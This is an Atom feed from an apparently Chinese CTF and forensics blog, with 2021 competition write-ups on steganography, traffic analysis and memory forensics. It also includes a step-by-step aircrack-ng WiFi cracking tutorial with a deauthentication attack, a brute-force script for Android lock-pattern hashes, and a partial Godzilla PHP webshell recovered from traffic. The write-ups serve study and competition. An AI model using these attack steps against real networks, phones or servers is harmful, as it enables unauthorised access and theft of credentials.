<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>The blog of mklkx</title>
  <icon>https://www.gravatar.com/avatar/6304657417bd40e9a3c6f5c53a19ef73</icon>
  
  <link href="http://mklkx.github.io/atom.xml" rel="self"/>
  
  <link href="http://mklkx.github.io/"/>
  <updated>2021-11-15T12:15:22.820Z</updated>
  <id>http://mklkx.github.io/</id>
  
  <author>
    <name>煤矿路口西</name>
    <email>mklkx_yep@163.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>深育杯</title>
    <link href="http://mklkx.github.io/2021/11/13/%E6%B7%B1%E8%82%B2%E6%9D%AF/"/>
    <id>http://mklkx.github.io/2021/11/13/%E6%B7%B1%E8%82%B2%E6%9D%AF/</id>
    <published>2021-11-13T12:11:21.000Z</published>
    <updated>2021-11-15T12:15:22.820Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="深育杯">深育杯</span></h3><hr><h4><span id="login">Login</span></h4><p>压缩包伪加密得到&quot;实例-副本.txt&quot;，也就得到了一个明文。</p><p>从而进行明文攻击，得到example.zip的密码qwe@123</p><p>password.zip中三个txt大小都为6，想到crc32爆破</p><p><a class="link" href="https://blog.csdn.net/u011377996/article/details/79360820">https://blog.csdn.net/u011377996/article/details/79360820<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 crc32.py reverse 0x2E5EF0DE</span><br></pre></td></tr></table></figure><p>从而绕过压缩包密码这回事直接得到txt的内容</p><p><img lazyload src="/images/loading.svg" data-src="image1.png" alt="1"></p><p><img lazyload src="/images/loading.svg" data-src="image2.png" alt="2"></p><p><img lazyload src="/images/loading.svg" data-src="image3.png" alt="3"></p><p>得到【welc0m】【e_sang】【forctf】</p><p>解密压缩包，得到.password.swp</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim -r .password.swp</span><br></pre></td></tr></table></figure><p>还原得到</p><p><img lazyload src="/images/loading.svg" data-src="image4.png" alt="4"></p><p>登陆平台得到flag</p><p>Sangfor{ef3d229c-0d10-4d99-a768-ff41a4d624e7}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;深育杯&quot;&gt;深育杯&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;login&quot;&gt;Login&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;压缩包伪加密得到&amp;quot;实例-副本.txt&amp;quot;，也就得到了一个明文。&lt;/p&gt;
&lt;p&gt;从而进行明文攻击，得</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>ByteCTF2021</title>
    <link href="http://mklkx.github.io/2021/10/17/ByteCTF2021/"/>
    <id>http://mklkx.github.io/2021/10/17/ByteCTF2021/</id>
    <published>2021-10-17T09:11:27.000Z</published>
    <updated>2021-10-19T09:16:48.580Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="2021字节跳动安全范儿高校挑战赛">2021字节跳动安全范儿高校挑战赛</span></h3><hr><h3><span id="frequently">frequently</span></h3><p>发现dns里存在文本【o.bytedanec.top】和【i.bytedanec.top】</p><p>猜测o和i转0和1</p><p>通过wireshark导出.csv，</p><p>notepad++进行数据处理后</p><p><img lazyload src="/images/loading.svg" data-src="1.png" alt="1"></p><p>编写脚本</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str&#x3D;&#39;&#39;</span><br><span class="line">final&#x3D;&#39;&#39;</span><br><span class="line">list&#x3D;[]</span><br><span class="line">with open(&#39;bytedanec_io.txt&#39;) as f:</span><br><span class="line">    list.append(f.readlines())</span><br><span class="line">    print(list[0])</span><br><span class="line">    for k in list[0]:</span><br><span class="line">        #print(k)</span><br><span class="line">        if &#39;o.bytedanec.top&#39; in k:</span><br><span class="line">            str +&#x3D; &#39;0&#39;</span><br><span class="line">        if &#39;i.bytedanec.top&#39; in k:</span><br><span class="line">            str +&#x3D; &#39;1&#39;</span><br><span class="line">    print(str)</span><br><span class="line">print(len(str))</span><br><span class="line">for m in range(0,len(str)):</span><br><span class="line">    if m &#x3D;&#x3D; 0:</span><br><span class="line">        final +&#x3D; str[m]</span><br><span class="line">    elif m % 8 &#x3D;&#x3D; 0:</span><br><span class="line">        final +&#x3D; &#39; &#39;</span><br><span class="line">        final +&#x3D; str[m]</span><br><span class="line">    else:</span><br><span class="line">        final +&#x3D; str[m]</span><br><span class="line">print(final)</span><br><span class="line">#01010100 01101000 01100101 00100000 01100110 01101001 01110010 01110011 01110100 00100000 01110000 01100001 01110010 01110100 00100000 01101111 01100110 00100000 01100110 01101100 01100001 01100111 00111010 00100000 01000010 01111001 01110100 01100101 01000011 01010100 01000110 01111011 01011110 01011111 01011110 01100101 01101110 01001010 00110000 01111001 00100110 01111001 00110000 01110101 01110010</span><br><span class="line">#Thefirstpartofflag:ByteCTF&#123;^_^enJ0y&amp;y0ur</span><br></pre></td></tr></table></figure><p>后半段追踪UDP流</p><p><img lazyload src="/images/loading.svg" data-src="2.png" alt="2"></p><p>发现可疑字样</p><p>得到后半段flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sse1f_wIth_m1sc^_^&#125;</span><br></pre></td></tr></table></figure><p>拼接得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ByteCTF&#123;^_^enJ0y&amp;y0urse1f_wIth_m1sc^_^&#125;</span><br></pre></td></tr></table></figure><h4><span id="hearingnotbelieving">HearingNotBelieving</span></h4><p>二血</p><p>根据签到盲猜前半段为ByteCTF{</p><p><img lazyload src="/images/loading.svg" data-src="3.png" alt="3"></p><p>au看到中间段flag</p><p>汉信码，扫不出来，尝试手动还原</p><p><img lazyload src="/images/loading.svg" data-src="4.png" alt="4"></p><p>RX-SSTV还原了后半段flag</p><p>手动还原</p><p><img lazyload src="/images/loading.svg" data-src="5.png" alt="5"></p><p>ByteCTF{m4yB3_U_kn0W_S57V}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;2021字节跳动安全范儿高校挑战赛&quot;&gt;2021字节跳动安全范儿高校挑战赛&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h3&gt;&lt;span id=&quot;frequently&quot;&gt;frequently&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;发现dns里存在文本【o.bytedan</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>莲城杯</title>
    <link href="http://mklkx.github.io/2021/10/15/%E8%8E%B2%E5%9F%8E%E6%9D%AF/"/>
    <id>http://mklkx.github.io/2021/10/15/%E8%8E%B2%E5%9F%8E%E6%9D%AF/</id>
    <published>2021-10-15T08:58:32.000Z</published>
    <updated>2021-10-19T09:16:48.581Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="首届莲城杯网络安全技能大赛">首届“莲城杯”网络安全技能大赛</span></h3><hr><h4><span id="bitmap">BitMap</span></h4><p>bmp爆破宽度</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line">import zlib</span><br><span class="line">f &#x3D; open(&#39;BitMap&#39;,&#39;rb&#39;)</span><br><span class="line">c &#x3D; f.read()</span><br><span class="line">width &#x3D; c[18:22]</span><br><span class="line">height &#x3D; c[22:26]</span><br><span class="line"># 爆破bmp宽度</span><br><span class="line">for i in range(900,1306):</span><br><span class="line">    f1 &#x3D; open(str(i)+&#39;.bmp&#39;,&#39;wb&#39;)</span><br><span class="line">    # print(struct.pack(&#39;&gt;i&#39;,i)[::-1])</span><br><span class="line">    img &#x3D; c[:18]+struct.pack(&#39;&gt;i&#39;,i)[::-1]+c[22:]</span><br><span class="line">    f1.write(img)</span><br><span class="line">    f1.close()</span><br></pre></td></tr></table></figure><p>得到宽度为900</p><p>图片本身高度为-300</p><p>改为</p><p><img lazyload src="/images/loading.svg" data-src="1.png" alt="1"></p><p>参考强网杯三体那道题的思路</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">with open(&#39;900.bmp&#39;, &#39;rb&#39;) as f:</span><br><span class="line">    d &#x3D; f.read()</span><br><span class="line">    w &#x3D; 900</span><br><span class="line">    h &#x3D; 300#图片显示为-300</span><br><span class="line">    b &#x3D; 4</span><br><span class="line">    l &#x3D; bytearray(d)</span><br><span class="line">    off &#x3D; l[10]</span><br><span class="line">    for i in range(h):</span><br><span class="line">        for j in range(w):</span><br><span class="line">            l[off+j*b+i*b*w] &#x3D; l[off+j*b+i*b*w+3]</span><br><span class="line">            with open(&#39;threebody_new.bmp&#39;, &#39;wb&#39;) as f:</span><br><span class="line">                f.write(l)</span><br></pre></td></tr></table></figure><p>得到</p><p><img lazyload src="/images/loading.svg" data-src="2.bmp" alt="2"></p><p>镜像一下，得到</p><p>IRAVGQ2UIZ5TAMBXMJSDIOJRHEYTKMRXG5STEMTEGIYDKZDFMU2DEOLGGQZDIYL5</p><p><img lazyload src="/images/loading.svg" data-src="3.png" alt="3"></p><p><strong>DASCTF{007bd491915277e22d205dee429f424a}</strong></p><h4><span id="midi-player">midi player</span></h4><p><img lazyload src="/images/loading.svg" data-src="4.png" alt="4"></p><p>查看源码得到了mid</p><p><img lazyload src="/images/loading.svg" data-src="5.png" alt="5"></p><p><strong>flag{Th3_M1D1_SteGh1d3_is_T0_1asy}</strong></p><h4><span id="解密试试">解密试试</span></h4><p>strings看到flag.txt</p><p>但filescan却始终没有，考虑是被删除了</p><p><img lazyload src="/images/loading.svg" data-src="6.png" alt="6"></p><p>却发现了hint.txt</p><p>dumpfiles扒下来看看</p><p><img lazyload src="/images/loading.svg" data-src="7.png" alt="7"></p><p>找系统密码</p><p><img lazyload src="/images/loading.svg" data-src="8.png" alt="8"></p><p><img lazyload src="/images/loading.svg" data-src="9.png" alt="9"></p><p>passwd123</p><p>根据思路，<a class="link" href="http://www.jsons.cn/rabbitencrypt/">http://www.jsons.cn/rabbitencrypt/<i class="fas fa-external-link-alt"></i></a></p><p>继续找明文</p><p>在剪贴板里找到完整明文</p><p><img lazyload src="/images/loading.svg" data-src="10.png" alt="10"></p><p><img lazyload src="/images/loading.svg" data-src="11.png" alt="11"></p><p><strong>DASCTF{bad935cc4824223e69162bc68f25275e}</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;首届莲城杯网络安全技能大赛&quot;&gt;首届“莲城杯”网络安全技能大赛&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;bitmap&quot;&gt;BitMap&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;bmp爆破宽度&lt;/p&gt;
&lt;figure class=&quot;highlig</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>鹤城杯</title>
    <link href="http://mklkx.github.io/2021/10/08/%E9%B9%A4%E5%9F%8E%E6%9D%AF/"/>
    <id>http://mklkx.github.io/2021/10/08/%E9%B9%A4%E5%9F%8E%E6%9D%AF/</id>
    <published>2021-10-08T02:31:47.000Z</published>
    <updated>2021-10-12T03:30:49.134Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="首届鹤城杯河南鹤壁ctf网络安全挑战赛">首届“鹤城杯”河南·鹤壁CTF网络安全挑战赛</span></h3><hr><h4><span id="new_misc">new_misc</span></h4><p>wbStego不带key直接跑</p><p><img lazyload src="/images/loading.svg" data-src="1.png" alt="1"></p><p><img lazyload src="/images/loading.svg" data-src="2.png" alt="2"></p><p><strong>flag{verY_g00d_YoU_f0und_th1s}</strong></p><h4><span id="流量分析">流量分析</span></h4><p>手撸</p><p><img lazyload src="/images/loading.svg" data-src="3.png" alt="3"></p><p>好在直接明文能看</p><p><img lazyload src="/images/loading.svg" data-src="4.png" alt="4"></p><p><strong>flag{w1reshARK_ez_1sntit}</strong></p><h4><span id="a_misc">a_misc</span></h4><p>zip爆破</p><p><img lazyload src="/images/loading.svg" data-src="5.png" alt="5"></p><p>png更改文件高度</p><p><img lazyload src="/images/loading.svg" data-src="6.png" alt="6"></p><p>pcapng中看到注入</p><p><img lazyload src="/images/loading.svg" data-src="7.png" alt="7"></p><p>找能长篇urldecode的工具</p><p><img lazyload src="/images/loading.svg" data-src="8.png" alt="8"></p><p>脚本修改正则直接出</p><p><img lazyload src="/images/loading.svg" data-src="9.png" alt="9"></p><p><strong>flag{cd2c3e2fea463ded9af800d7155be7aq}</strong></p><h4><span id="misc2">MISC2</span></h4><p><img lazyload src="/images/loading.svg" data-src="10.png" alt="10"></p><p>数据处理后</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">666c61677b6830775f34626f75545f656e633064655f346e645f706e477dm</span><br></pre></td></tr></table></figure><p><strong>flag{h0w_4bouT_enc0de_4nd_pnG}</strong></p><h4><span id="mi">MI</span></h4><p>找到类似解法</p><p><a class="link" href="https://www.freebuf.com/articles/network/255145.html">https://www.freebuf.com/articles/network/255145.html<i class="fas fa-external-link-alt"></i></a></p><p>进而找到原题</p><p><img lazyload src="/images/loading.svg" data-src="11.png" alt="11"></p><p><a class="link" href="http://www.glun.top/2020/10/05/ctf02/">http://www.glun.top/2020/10/05/ctf02/<i class="fas fa-external-link-alt"></i></a></p><p><img lazyload src="/images/loading.svg" data-src="12.png" alt="12"></p><p><img lazyload src="/images/loading.svg" data-src="13.png" alt="13"></p><p><strong>flag{5cae25efeb73d7ba22f7728427376f59}</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;首届鹤城杯河南鹤壁ctf网络安全挑战赛&quot;&gt;首届“鹤城杯”河南·鹤壁CTF网络安全挑战赛&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;new_misc&quot;&gt;new_misc&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;wbStego不带key直接跑&lt;/</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>kali爆破wifi密码</title>
    <link href="http://mklkx.github.io/2021/10/04/kali%E7%88%86%E7%A0%B4wifi%E5%AF%86%E7%A0%81/"/>
    <id>http://mklkx.github.io/2021/10/04/kali%E7%88%86%E7%A0%B4wifi%E5%AF%86%E7%A0%81/</id>
    <published>2021-10-04T08:28:00.000Z</published>
    <updated>2021-10-06T09:41:02.158Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="kali爆破wifi密码">kali爆破wifi密码</span></h3><hr><p>该方法的核心思想即通过监听模式去捕获周围的无线信号，对指定的路由器展开攻击，强行断开连接。那么与他连接的设备会尝试重新连接，此时的数据包被我们捕获到后，再通过字典爆破匹配该信号的密码。</p><h4><span id="查看网卡">查看网卡</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure><p>本来的网络状态</p><p><img lazyload src="/images/loading.svg" data-src="0.png" alt="0"></p><p>插上网盘之后</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="1.png" alt="1"></p><p>进行校验</p><p><img lazyload src="/images/loading.svg" data-src="2.png" alt="2"></p><p>出现了wlan0mon</p><h4><span id="扫描当前环境中的wifi">扫描当前环境中的wifi</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure><p>直到第二行出现[<strong>PMKID found: xxx</strong>(BSSID)]或[WPA <strong>handshake:xxx</strong>(BSSID)]时</p><p>表明获取到了包含WPA-PSK密码的此握手数据报文</p><p><img lazyload src="/images/loading.svg" data-src="3.png" alt="3"></p><p>重点观察此处橙色标记</p><ul><li>BSSID　　AP端的mac地址</li><li>PWR     信号强度（绝对值越小，信号越强）</li><li>Data     对应路由器的在线数据吞吐量，数值越大，数值上传量越大</li><li>CH      对应路由的频道</li><li>ESSID    对应路由器的名称</li></ul><p>接下来我们观察此AP(BSSID是否)同时在下面两部分出现</p><h4><span id="抓取wifi数据包">抓取wifi数据包</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">airodump-ng -c 1 --ivs -w IDP --bssid 90:E7:10:24:43:F1 wlan0mon</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="4.png" alt="4"></p><p>这个终端用以捕获按 BSSID 过滤的数据，并仅保存捕获的ivs再进行重命名</p><p>我们可以看到这个终端始终处于接收状态，等待捕获符合的数据</p><h4><span id="强制重连">强制重连</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aireplay-ng -0 0 -a 90:E7:10:24:43:F1 -c 9C:5A:81:71:15:B7 wlan0mon</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="5.png" alt="5"></p><p>等指定BSSID和指定STATION的Frames积累到差不多20000以上后，</p><h4><span id="开始爆破">开始爆破</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aircrack-ng -w &lt;指定字典路径&gt; &lt;握手包路径&gt;</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="6.png" alt="6"></p><p><img lazyload src="/images/loading.svg" data-src="7.png" alt="7"></p><p>得到了wifi的密码</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;kali爆破wifi密码&quot;&gt;kali爆破wifi密码&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;p&gt;该方法的核心思想即通过监听模式去捕获周围的无线信号，对指定的路由器展开攻击，强行断开连接。那么与他连接的设备会尝试重新连接，此时的数据包被我们捕获到后，再通过</summary>
      
    
    
    
    
    <category term="取证" scheme="http://mklkx.github.io/tags/%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>破解Android镜像锁屏密码</title>
    <link href="http://mklkx.github.io/2021/09/21/%E7%A0%B4%E8%A7%A3Android%E9%95%9C%E5%83%8F%E9%94%81%E5%B1%8F%E5%AF%86%E7%A0%81/"/>
    <id>http://mklkx.github.io/2021/09/21/%E7%A0%B4%E8%A7%A3Android%E9%95%9C%E5%83%8F%E9%94%81%E5%B1%8F%E5%AF%86%E7%A0%81/</id>
    <published>2021-09-21T03:06:50.000Z</published>
    <updated>2021-09-22T09:42:24.437Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="破解android镜像锁屏密码">破解Android镜像锁屏密码</span></h3><hr><h4><span id="制作准备">制作准备</span></h4><p>首先我们需要手动制作一个Android镜像。</p><p>此处我们采用方便的“夜神模拟器”直接创建一个安卓镜像，并设置锁屏密码</p><p><img lazyload src="/images/loading.svg" data-src="make_1.jpg" alt="make_1"></p><h4><span id="破解过程">破解过程</span></h4><p>取证大师打开vmdk文件</p><p>nox_2-disk2.vmdk/分区3/system/<strong>device_policies.xml</strong></p><p>nox_2-disk2.vmdk/分区3/system/<strong>gatekeeper.password.key</strong></p><p>nox_2-disk2.vmdk/分区3/system/<strong>gatekeeper.pattern.key</strong></p><p><img lazyload src="/images/loading.svg" data-src="make_2.jpg" alt="make_2"></p><p>根据device_policies.xml文件中，我们得到该解锁图案的长度为9</p><p><img lazyload src="/images/loading.svg" data-src="make_3.jpg" alt="make_3"></p><p>同时我们可以看到密码由纯数字构成。</p><p>在此基础上，个人认为除了图案密码，其他的密码也有了爆破的可行性。</p><p>结合scrypt-hash算法<a class="link" href="https://github.com/dannycoates/scrypt-hash">GitHub - dannycoates/scrypt-hash: node bindings for crypto_scrypt<i class="fas fa-external-link-alt"></i></a>，对文中给出的m-pass-hash.py进行改进后</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import struct</span><br><span class="line">import binascii</span><br><span class="line">import pyscrypt</span><br><span class="line"></span><br><span class="line">N &#x3D; 16384</span><br><span class="line">r &#x3D; 8</span><br><span class="line">p &#x3D; 1</span><br><span class="line"></span><br><span class="line">f &#x3D; open(&#39;gatekeeper.pattern.key&#39;, &#39;rb&#39;)  # 读取gatekeeper.pattern.key文件</span><br><span class="line">blob &#x3D; f.read()</span><br><span class="line">s &#x3D; struct.Struct(&#39;&lt;&#39; + &#39;17s 8s 32s&#39;)</span><br><span class="line">(meta, salt, signature) &#x3D; s.unpack_from(blob)  # 提取其中关键的信息</span><br><span class="line"></span><br><span class="line">f1 &#x3D; open(&#39;password.txt&#39;, &#39;r&#39;)  # 读取字典</span><br><span class="line">lines &#x3D; f1.readlines()</span><br><span class="line">for data in lines:</span><br><span class="line">    password &#x3D; data.strip()</span><br><span class="line">    # print meta</span><br><span class="line">    to_hash &#x3D; meta</span><br><span class="line">    # print to_hash</span><br><span class="line">    print password</span><br><span class="line">    # print signature</span><br><span class="line">    to_hash +&#x3D; password # 将字典中读取的密码和meta信息组合成to_hash</span><br><span class="line">    hash &#x3D; pyscrypt.hash(to_hash, salt, N, r, p, dkLen&#x3D;32)</span><br><span class="line">    print &#39;signature  %s&#39; % signature.encode(&#39;hex&#39;)</span><br><span class="line"></span><br><span class="line">    print &#39;Hash:      %s&#39; % hash[0:32].encode(&#39;hex&#39;)  # 取hash值的前32位</span><br><span class="line"></span><br><span class="line">    print &#39;Equal:     %s&#39; % (hash[0:32] &#x3D;&#x3D; signature)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if hash[0:32] &#x3D;&#x3D; signature:  # 如果相同，程序结束</span><br><span class="line">        print(&quot;OK&quot;)</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><p>其中的password.txt实际是不重复的1-9的全排列：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file1&#x3D;open(&#39;password.txt&#39;,&#39;a&#39;)</span><br><span class="line">for a in &quot;123456789&quot;:</span><br><span class="line">    for b in &quot;123456789&quot;:</span><br><span class="line">        for c in &quot;123456789&quot;:</span><br><span class="line">            for d in &quot;123456789&quot;:</span><br><span class="line">                for e in &quot;123456789&quot;:</span><br><span class="line">                    for f in &quot;123456789&quot;:</span><br><span class="line">                        for g in &quot;123456789&quot;:</span><br><span class="line">                            for h in &quot;123456789&quot;:</span><br><span class="line">                                for i in &quot;123456789&quot;:</span><br><span class="line">                                    if a !&#x3D; b and a !&#x3D; c and a !&#x3D; d and a !&#x3D; e and a !&#x3D; f and a!&#x3D; g  and a !&#x3D; h  and a !&#x3D;i\</span><br><span class="line">                                            and b !&#x3D; c and b!&#x3D; d and  b !&#x3D; e and b !&#x3D; f and b!&#x3D; g  and b !&#x3D; h  and b !&#x3D;i\</span><br><span class="line">                                            and c !&#x3D; d and c !&#x3D; e and c !&#x3D; f and c!&#x3D; g  and c !&#x3D; h and c !&#x3D;i\</span><br><span class="line">                                            and d !&#x3D; e and d !&#x3D; f and d!&#x3D; g and d !&#x3D; h and d !&#x3D;i\</span><br><span class="line">                                            and e !&#x3D; f and e!&#x3D; g  and e !&#x3D; h and e !&#x3D;i\</span><br><span class="line">                                            and f !&#x3D; g  and f !&#x3D; h and f !&#x3D;i\</span><br><span class="line">                                            and g !&#x3D; h and g !&#x3D;i\</span><br><span class="line">                                            and h !&#x3D; i:</span><br><span class="line">                                        password &#x3D; a + b + c + d + e + f + g + h + i</span><br><span class="line">                                        file1.write(password+&#39;\n&#39;)</span><br><span class="line">file1.close()</span><br></pre></td></tr></table></figure><p>运行结果如下(python2)</p><p><img lazyload src="/images/loading.svg" data-src="make_4.jpg" alt="make_4"></p><p>从而知道锁屏密码为124578963</p><p>对应到图案为</p><p><img lazyload src="/images/loading.svg" data-src="make_5.jpg" alt="make_5"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;破解android镜像锁屏密码&quot;&gt;破解Android镜像锁屏密码&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;制作准备&quot;&gt;制作准备&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;首先我们需要手动制作一个Android镜像。&lt;/p&gt;
&lt;p&gt;此处我们采用</summary>
      
    
    
    
    
    <category term="取证" scheme="http://mklkx.github.io/tags/%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>陇剑杯-2</title>
    <link href="http://mklkx.github.io/2021/09/14/%E9%99%87%E5%89%91%E6%9D%AF-2/"/>
    <id>http://mklkx.github.io/2021/09/14/%E9%99%87%E5%89%91%E6%9D%AF-2/</id>
    <published>2021-09-14T03:13:30.000Z</published>
    <updated>2021-10-12T03:42:38.072Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="首届陇剑杯网络安全大赛-2">首届“<em>陇剑杯</em>”网络安全大赛-2</span></h3><hr><h4><span id="内存分析">内存分析</span></h4><h5><span id="61">6.1</span></h5><p>虚拟机密码找mimikatz</p><p>安装插件后运行</p><p><img lazyload src="/images/loading.svg" data-src="28.png" alt="28"></p><p>flag{W31C0M3 T0 THiS 34SY F0R3NSiCX}</p><h5><span id="62">6.2</span></h5><p>题干提到关键词，某品牌手机&amp;图片</p><p>首先搜索桌面文件</p><p><img lazyload src="/images/loading.svg" data-src="29.png" alt="29"></p><p>发现HUAWEI字样</p><p>搜索HUAWEI字样</p><p><img lazyload src="/images/loading.svg" data-src="30.png" alt="30"></p><p>依次dumpfiles</p><p>解压exe文件得到</p><p><img lazyload src="/images/loading.svg" data-src="31.png" alt="31"></p><p>搜索得到一个解密程序kobackupdec</p><p>kali里执行未果</p><p>windows中</p><p><img lazyload src="/images/loading.svg" data-src="32.png" alt="32"></p><p>找到images.tar</p><p><img lazyload src="/images/loading.svg" data-src="33.png" alt="33"></p><h4><span id="简单日志分析">简单日志分析</span></h4><h5><span id="71">7.1</span></h5><p><img lazyload src="/images/loading.svg" data-src="34.png" alt="34"></p><p>如上图所示，user为攻击参数</p><p>答案：user</p><h5><span id="72">7.2</span></h5><p>解码如同所示base64，发现cat命令查看的文件绝对路径。</p><p><img lazyload src="/images/loading.svg" data-src="35.png" alt="35"></p><p><img lazyload src="/images/loading.svg" data-src="36.png" alt="36"></p><p>答案：/Th4s_IS_VERY_Import_Fi1e</p><h5><span id="73">7.3</span></h5><p>同样发现一条base64解码后是具有反弹shell的地址，解出。</p><p><img lazyload src="/images/loading.svg" data-src="37.png" alt="37"></p><p><img lazyload src="/images/loading.svg" data-src="38.png" alt="38"></p><p>答案:192.168.2.197:8888</p><h4><span id="sql注入">SQL注入</span></h4><h5><span id="81">8.1</span></h5><p>黑客在注入过程中采用的注入手法叫_____________。（格式为4个汉字，例如“拼搏努力”）</p><p><img lazyload src="/images/loading.svg" data-src="39.png" alt="39"></p><p>答案：布尔盲注</p><h5><span id="82">8.2</span></h5><p>黑客在注入过程中，最终获取flag的数据库名、表名和字段名是_____________。（格式为“数据库名#表名#字段名”，例如database#table#column）</p><p>直接分析日志，根据if语句的判断条件和每行后面状态码判断就行</p><p><img lazyload src="/images/loading.svg" data-src="40.png" alt="40"></p><h5><span id="83">8.3</span></h5><p>黑客最后获取到的flag字符串为_____________。</p><p>同8.2，继续分析日志就行</p><p><img lazyload src="/images/loading.svg" data-src="41.png" alt="41"></p><p>答案：flag{deddcd67-bcfd-487e-b940-1217e668c7db}</p><h4><span id="wifi">wifi</span></h4><h5><span id="91">9.1</span></h5><p>流量包里记录了攻击机的攻击流量，</p><p>参考上述题目，通过filescan发现存在【wifi】字样</p><p>下载后是一个加密压缩包</p><p><img lazyload src="/images/loading.svg" data-src="42.png" alt="42"></p><p>提示Network Adapter GUID</p><p>找了很久，意外在iehistory中发现类似字符</p><p><img lazyload src="/images/loading.svg" data-src="43.png" alt="43"></p><p>{529B7D2A-05D1-4F21-A001-8F4FF817FC3A}/{E3C4941F-44A3-4E23-924D-67A2B3680A87}.xml</p><p>尝试解压</p><p>得到xml</p><p><img lazyload src="/images/loading.svg" data-src="44.png" alt="44"></p><p>以为flag是233@114514_qwe</p><p>但不对</p><p>尝试搜索wifi&amp;解密&amp;WPA2PSK</p><p>最后找到https://www.jianshu.com/p/7e8ddf4338cd?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation</p><p><img lazyload src="/images/loading.svg" data-src="45.png" alt="45"></p><p><img lazyload src="/images/loading.svg" data-src="46.png" alt="46"></p><p>得到解码后的流量包</p><p>解码无果后，重新尝试哥斯拉木马连接</p><p>分别在服务器端和客户端得到</p><p>请求包和相应包</p><p>通过处理得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">，@session_start();</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">@error_reporting(0);</span><br><span class="line">function encode($D,$K)&#123;</span><br><span class="line">    for($i&#x3D;0;$i&lt;strlen($D);$i++) &#123;</span><br><span class="line">        $c &#x3D; $K[$i+1&amp;15];</span><br><span class="line">        $D[$i] &#x3D; $D[$i]^$c;</span><br><span class="line">    &#125;</span><br><span class="line">    return $D;</span><br><span class="line">&#125;</span><br><span class="line">$pass&#x3D;&#39;key&#39;;</span><br><span class="line">$payloadName&#x3D;&#39;payload&#39;;</span><br><span class="line">$key&#x3D;&#39;3c6e0b8a9c15224a&#39;;</span><br><span class="line">if (isset($_POST[$pass]))&#123;</span><br><span class="line">    